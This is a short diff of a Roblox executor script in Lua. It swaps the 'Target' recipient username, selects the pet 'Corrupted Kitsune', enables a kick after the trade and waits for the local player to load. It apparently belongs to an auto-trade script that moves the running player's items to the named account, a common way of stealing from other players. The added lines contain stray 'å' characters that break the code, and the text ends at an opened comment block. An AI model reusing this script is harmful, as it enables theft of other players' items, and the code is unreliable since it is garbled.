@@ -1,12 +1,12 @@
-getgenv().Target = "cyberoJH6rXOliaD4"
+getgenv().Target = "matrix4QFeycYL0pz"
 getgenv().Select_Pet = {
     "Corrupted Kitsune"
 }
 getgenv().Kick_After_Trade = true
 repeat task.wait() until game:IsLoaded()
-repeat task.wait() until game.Players.LocalPlayer.Character
+repeat task.wait() until game.Players.LocalPlayer.Characterå
 
-local plr = game:GetService("Players").LocalPlayer
+local plr = game:GetService("Players").LocalPlayerå
 local VirtualUser = game:service "VirtualUser"
 
 --[[if game.JobId ~= getgenv().JobId then
